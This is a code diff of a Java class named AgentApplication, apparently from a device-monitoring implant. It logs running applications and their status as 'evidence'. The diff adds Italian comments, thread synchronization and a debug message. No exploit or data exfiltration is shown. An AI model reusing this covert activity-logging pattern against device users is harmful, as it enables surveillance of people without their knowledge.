@@ -44,6 +44,7 @@ public class AgentApplication extends AgentBase implements IncrementalLog, Obser
 
 	@Override
 	public void begin() {
+		// viene creato un file temporaneo di log application, aperto.
 		logIncremental = new LogR(EvidenceType.APPLICATION);
 		ListenerProcess.self().attach(this);
 	}
@@ -51,6 +52,7 @@ public class AgentApplication extends AgentBase implements IncrementalLog, Obser
 	@Override
 	public void end() {
 		ListenerProcess.self().detach(this);
+		// il log viene chiuso.
 		logIncremental.close();
 	}
 
@@ -59,6 +61,11 @@ public class AgentApplication extends AgentBase implements IncrementalLog, Obser
 		return 0;
 	}
 
+	/**
+	 * Viene invocata dalla notification, a sua volta invocata dal listener
+	 * @param process
+	 * @param status
+	 */
 	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
 		if (Cfg.DEBUG) {
 			Check.requires(process != null, "null process"); //$NON-NLS-1$
@@ -79,15 +86,21 @@ public class AgentApplication extends AgentBase implements IncrementalLog, Obser
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
 		}
-		logIncremental.write(items);
+
+		synchronized (this) {
+			logIncremental.write(items);
+		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveEvidence): " + name + " " + status.name()) ;//$NON-NLS-1$ //$NON-NLS-2$
+			Check.log(TAG + " (saveEvidence): " + name + " " + status.name());//$NON-NLS-1$ //$NON-NLS-2$
 		}
 	}
 
-	public void resetLog() {
-		if(logIncremental.hasData()){
+	public synchronized void resetLog() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (resetLog)");
+		}
+		if (logIncremental.hasData()) {
 			logIncremental.close();
 			logIncremental = new LogR(EvidenceType.APPLICATION);
 		}
